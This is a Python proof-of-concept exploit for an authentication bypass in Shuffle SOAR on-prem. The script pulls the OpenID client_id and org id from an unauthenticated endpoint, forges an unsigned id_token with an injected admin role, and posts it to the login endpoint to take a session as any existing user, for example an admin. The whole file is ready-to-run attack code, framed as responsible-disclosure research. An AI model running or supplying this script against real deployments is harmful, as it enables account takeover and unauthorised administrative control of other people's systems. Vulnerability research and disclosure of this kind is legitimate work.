#!/usr/bin/env python3
"""
Shuffle SOAR (on-prem) - unauthenticated OpenID Connect login bypass -> account takeover.

The on-prem /api/v1/login_openid endpoint accepts an id_token that is POSTed to it, but it
never checks the token's signature. It trusts the token if the "aud" field inside it matches
the org's OpenID client_id, which is a public value. So we can hand it a token we wrote
ourselves and log in as any existing user (e.g. an admin).

The org_id and client_id we need are both handed out by the unauthenticated
/api/v1/checkusers endpoint, so no prior access is required.

Usage:
    python3 shuffle_openid_takeover.py --url http://TARGET:5001 --email admin@victim.com
    # optional: --org <uuid> --client-id <id>   (auto-discovered if omitted)
    # optional: --proxy http://127.0.0.1:8080   (route through Burp)

Author: security research / responsible disclosure. Use only on systems you are allowed to test.
"""

import argparse
import base64
import http.cookiejar
import json
import re
import sys
import urllib.parse
import urllib.request


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    # the success response is a 303 that carries the session cookie; don't chase it
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def send(method, base, path, body=None, headers=None, cj=None, proxy=None, follow=True):
    handlers = []
    if cj is not None:
        handlers.append(urllib.request.HTTPCookieProcessor(cj))
    if not follow:
        handlers.append(_NoRedirect())
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    opener = urllib.request.build_opener(*handlers)
    data = body.encode() if isinstance(body, str) else body
    req = urllib.request.Request(base + path, data=data, method=method,
                                 headers=headers or {})
    try:
        r = opener.open(req, timeout=30)
        return r.getcode(), r.read().decode("utf-8", "replace"), r
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e


def b64(raw):
    if isinstance(raw, str):
        raw = raw.encode()
    return base64.b64encode(raw).decode()


def discover(base, proxy):
    """Pull client_id and org_id out of the SSO URL that /checkusers gives anyone."""
    code, out, _ = send("GET", base, "/api/v1/checkusers", proxy=proxy)
    if code != 200:
        sys.exit("[-] /checkusers returned %s - is this a Shuffle backend?" % code)
    try:
        sso_url = json.loads(out).get("sso_url", "")
    except Exception:
        sso_url = ""
    if not sso_url:
        sys.exit("[-] No sso_url in /checkusers. Target probably has no OpenID SSO configured.")
    cid = re.search(r"client_id=([^&]+)", sso_url)
    cid = urllib.parse.unquote(cid.group(1)) if cid else None
    org = None
    st = re.search(r"state=([^&]+)", sso_url)
    if st:
        s = urllib.parse.unquote(st.group(1))
        s += "=" * ((4 - len(s) % 4) % 4)
        try:
            dec = base64.b64decode(s).decode("utf-8", "replace")
            m = re.search(r"org=([^&]+)", dec)
            if m:
                org = m.group(1)
        except Exception:
            pass
    return cid, org


def forge(client_id, org_id, email, admin=True):
    """Build an unsigned token the vulnerable code will accept."""
    nonce = b64("org=%s" % org_id)
    claims = {"aud": client_id, "nonce": nonce, "email": email, "sub": "poc"}
    if admin:
        claims["roles"] = ["shuffle-admin"]
    payload = json.dumps(claims)
    # the handler splits the POST body on "=", so the base64 must not end in "=" padding
    while len(payload.encode()) % 3 != 0:
        payload += " "
    token = b64(payload)
    assert "=" not in token
    return token


def main():
    ap = argparse.ArgumentParser(description="Shuffle on-prem OpenID auth bypass PoC")
    ap.add_argument("--url", required=True, help="Shuffle backend base URL, e.g. http://host:5001")
    ap.add_argument("--email", required=True, help="email of the user to log in as (an existing admin)")
    ap.add_argument("--org", help="org id (auto-discovered from /checkusers if omitted)")
    ap.add_argument("--client-id", dest="client_id", help="OpenID client id (auto-discovered if omitted)")
    ap.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 to view in Burp")
    ap.add_argument("--no-admin", action="store_true", help="don't inject the shuffle-admin role claim")
    args = ap.parse_args()
    base = args.url.rstrip("/")

    cid, org = args.client_id, args.org
    if not cid or not org:
        print("[*] Discovering client_id / org_id from /api/v1/checkusers (no auth) ...")
        d_cid, d_org = discover(base, args.proxy)
        cid = cid or d_cid
        org = org or d_org
    if not cid or not org:
        sys.exit("[-] Could not determine client_id/org_id. Provide them with --client-id / --org.")
    print("[+] client_id = %s" % cid)
    print("[+] org_id    = %s" % org)

    token = forge(cid, org, args.email, admin=not args.no_admin)
    print("[*] Forged unsigned id_token (no signature):")
    print("    %s" % token)

    cj = http.cookiejar.CookieJar()
    code, out, resp = send("POST", base, "/api/v1/login_openid",
                           body="id_token=" + token,
                           headers={"Content-Type": "application/x-www-form-urlencoded"},
                           cj=cj, proxy=args.proxy, follow=False)
    print("[*] POST /api/v1/login_openid -> HTTP %s" % code)
    session = None
    try:
        for c in resp.headers.get_all("Set-Cookie") or []:
            m = re.search(r"session_token=([^;]+)", c)
            if m:
                session = m.group(1)
    except Exception:
        pass
    if not session:
        print("    response body: %s" % out[:200])
        sys.exit("[-] No session cookie issued. User may not exist, or target not vulnerable.")
    print("[+] Got session_token cookie: %s" % session)

    code, out, _ = send("GET", base, "/api/v1/getinfo",
                        headers={"Cookie": "session_token=%s; __session=%s" % (session, session)},
                        proxy=args.proxy)
    try:
        who = json.loads(out)
    except Exception:
        who = {}
    print("[*] GET /api/v1/getinfo with that cookie -> HTTP %s" % code)
    print("    username = %r   admin = %r" % (who.get("username"), who.get("admin")))
    if who.get("username", "").lower() == args.email.lower():
        print("\n[+] SUCCESS - logged in as %s with no password." % args.email)
        print("[+] Use this header in Burp to browse as that user:")
        print("    Cookie: session_token=%s; __session=%s" % (session, session))
    else:
        print("\n[-] Logged in, but as an unexpected identity. Check the email.")


if __name__ == "__main__":
    main()
